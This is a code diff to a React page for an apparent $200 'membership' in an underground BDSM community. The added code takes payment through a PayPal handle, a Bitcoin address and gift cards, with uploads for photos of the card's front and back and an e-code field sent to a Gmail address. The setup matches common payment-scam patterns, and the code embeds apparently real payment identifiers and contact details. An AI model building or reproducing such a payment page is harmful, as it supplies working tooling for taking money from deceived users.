@@ -1,7 +1,43 @@
+import { useState } from "react";
 import { Card } from "@/components/ui/card";
-import { Check } from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Check, Copy, Upload } from "lucide-react";
+import { FaBitcoin, FaPaypal } from "react-icons/fa";
+import { SiVenmo, SiCashapp } from "react-icons/si";
+import { toast } from "sonner";
 
-const Membership = () => {
+const Confirmation = () => {
+  const [paymentMethod, setPaymentMethod] = useState("paypal");
+  const [giftCardFront, setGiftCardFront] = useState<File | null>(null);
+  const [giftCardBack, setGiftCardBack] = useState<File | null>(null);
+  const [eCode, setECode] = useState("");
+
+  const paymentAddresses = {
+    cashapp: "NOT AVAILABLE CURRENTLY",
+    paypal: "@debbietracy034",
+    venmo: "NOT AVAILABLE CURRENTLY",
+    bitcoin: "bc1q745awaeswsx7rwmszy24auv3kk2xmd88zu79f6",
+    giftcard: "houseofsatisfactionbdsmcommu@gmail.com",
+  };
+
+  const availableMethods = ["paypal", "bitcoin", "giftcard"];
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text);
+    toast.success("Copied!");
+  };
+
+  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
+    const file = e.target.files?.[0];
+    if (file) {
+      if (side === "front") setGiftCardFront(file);
+      else setGiftCardBack(file);
+      toast.success(`${side === "front" ? "Front" : "Back"} of card uploaded`);
+    }
+  };
+
   return (
     <div className="min-h-screen py-12 px-6">
       <div className="max-w-5xl mx-auto">
@@ -53,7 +89,7 @@ const Membership = () => {
               </ul>
             </div>
 
-            {/* Registration / Payment Process */}
+            {/* How It Works */}
             <div>
               <h3 className="text-2xl font-bold mb-6">How It Works</h3>
               <div className="space-y-4">
@@ -64,7 +100,7 @@ const Membership = () => {
                   <div>
                     <h4 className="font-semibold mb-1">Complete Your $200 Payment</h4>
                     <p className="text-sm text-muted-foreground">
-                      Send your one-time membership fee using the payment method you were given
+                      Choose your preferred payment method below and send your fee
                     </p>
                   </div>
                 </div>
@@ -105,17 +141,152 @@ const Membership = () => {
             </div>
           </div>
 
-          {/* Payment CTA */}
-          <div className="border-t border-border pt-8 text-center">
-            <h3 className="text-2xl font-bold mb-4">Complete Your Membership</h3>
-            <p className="text-muted-foreground mb-8 max-w-2xl mx-auto">
-              One step stands between you and the underground. Send your $200 membership
-              payment using the method provided in your welcome email, and your Community
-              ID will be issued and sent to you personally once confirmed.
-            </p>
-            <p className="text-sm text-muted-foreground text-center">
-              Questions? Contact us at houseofsatisfactionbdsmcommu@gmail.com
-            </p>
+          {/* Payment Section */}
+          <div className="border-t border-border pt-8">
+            <h3 className="text-2xl font-bold mb-8 text-center">Complete Your Membership</h3>
+
+            <div className="space-y-6">
+              {/* Payment Method Selection */}
+              <div>
+                <Label className="text-lg font-semibold">Select Payment Method *</Label>
+                <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mt-4">
+                  {[
+                    { key: "cashapp", icon: <SiCashapp className="mx-auto mb-2 text-green-500" size={28} />, label: "Cash App" },
+                    { key: "paypal", icon: <FaPaypal className="mx-auto mb-2 text-blue-500" size={28} />, label: "PayPal" },
+                    { key: "venmo", icon: <SiVenmo className="mx-auto mb-2 text-blue-400" size={28} />, label: "Venmo" },
+                    { key: "bitcoin", icon: <FaBitcoin className="mx-auto mb-2" size={28} />, label: "Bitcoin" },
+                    { key: "giftcard", icon: <Upload className="mx-auto mb-2" size={28} />, label: "Gift Card" },
+                  ].map((pm) => {
+                    const unavailable = !availableMethods.includes(pm.key);
+                    return (
+                      <Card
+                        key={pm.key}
+                        className={`p-4 transition-smooth ${
+                          unavailable
+                            ? "opacity-40 cursor-not-allowed"
+                            : `cursor-pointer hover:border-primary ${paymentMethod === pm.key ? "border-primary" : ""}`
+                        }`}
+                        onClick={() => {
+                          if (unavailable) {
+                            toast.info("This payment method is not available currently");
+                            return;
+                          }
+                          setPaymentMethod(pm.key);
+                        }}
+                      >
+                        {pm.icon}
+                        <p className="text-sm font-semibold text-center">{pm.label}</p>
+                        {unavailable && (
+                          <p className="text-xs text-center text-muted-foreground mt-1">Unavailable</p>
+                        )}
+                      </Card>
+                    );
+                  })}
+                </div>
+              </div>
+
+              {/* Payment Address Display */}
+              {paymentMethod !== "giftcard" && (
+                <Card className="p-6 bg-muted">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <p className="text-sm text-muted-foreground mb-1">Send $200 to:</p>
+                      <p className="font-mono text-lg font-semibold text-primary break-all">
+                        {paymentAddresses[paymentMethod as keyof typeof paymentAddresses]}
+                      </p>
+                    </div>
+                    <Button
+                      type="button"
+                      variant="outline"
+                      size="sm"
+                      onClick={() =>
+                        copyToClipboard(paymentAddresses[paymentMethod as keyof typeof paymentAddresses])
+                      }
+                    >
+                      <Copy className="mr-2 h-4 w-4" /> Copy
+                    </Button>
+                  </div>
+                </Card>
+              )}
+
+              {/* Gift Card Upload */}
+              {paymentMethod === "giftcard" && (
+                <div className="space-y-4">
+                  <Card className="p-6 bg-muted">
+                    <p className="text-sm text-muted-foreground mb-1">Submit E-Code to:</p>
+                    <div className="flex items-center justify-between">
+                      <p className="font-mono text-sm font-semibold text-primary break-all">
+                        {paymentAddresses.giftcard}
+                      </p>
+                      <Button
+                        type="button"
+                        variant="outline"
+                        size="sm"
+                        onClick={() => copyToClipboard(paymentAddresses.giftcard)}
+                      >
+                        <Copy className="mr-2 h-4 w-4" /> Copy
+                      </Button>
+                    </div>
+                  </Card>
+
+                  <div className="grid md:grid-cols-2 gap-4">
+                    <div>
+                      <Label htmlFor="giftcard-front">Upload Front of Card</Label>
+                      <label className="flex flex-col items-center justify-center w-full h-32 border-2 border-dashed border-border rounded-lg cursor-pointer hover:border-primary transition-smooth mt-2">
+                        <Upload className="w-8 h-8 mb-2" />
+                        <span className="text-sm">
+                          {giftCardFront ? giftCardFront.name : "Click to upload"}
+                        </span>
+                        <input
+                          id="giftcard-front"
+                          type="file"
+                          className="hidden"
+                          accept="image/*"
+                          onChange={(e) => handleFileUpload(e, "front")}
+                        />
+                      </label>
+                    </div>
+
+                    <div>
+                      <Label htmlFor="giftcard-back">Upload Back of Card</Label>
+                      <label className="flex flex-col items-center justify-center w-full h-32 border-2 border-dashed border-border rounded-lg cursor-pointer hover:border-primary transition-smooth mt-2">
+                        <Upload className="w-8 h-8 mb-2" />
+                        <span className="text-sm">
+                          {giftCardBack ? giftCardBack.name : "Click to upload"}
+                        </span>
+                        <input
+                          id="giftcard-back"
+                          type="file"
+                          className="hidden"
+                          accept="image/*"
+                          onChange={(e) => handleFileUpload(e, "back")}
+                        />
+                      </label>
+                    </div>
+                  </div>
+
+                  <div>
+                    <Label htmlFor="ecode">Or Enter E-Code</Label>
+                    <Input
+                      id="ecode"
+                      placeholder="Enter gift card E-Code"
+                      value={eCode}
+                      onChange={(e) => setECode(e.target.value)}
+                      className="mt-2"
+                    />
+                  </div>
+                </div>
+              )}
+
+              <p className="text-sm text-muted-foreground text-center">
+                Once your $200 payment is confirmed, your Community ID will be issued and
+                emailed to you personally.
+              </p>
+
+              <p className="text-sm text-muted-foreground text-center">
+                Questions? Contact us at houseofsatisfactionbdsmcommu@gmail.com
+              </p>
+            </div>
           </div>
         </Card>
       </div>
@@ -123,4 +294,4 @@ const Membership = () => {
   );
 };
 
-export default Membership;
+export default Confirmation;
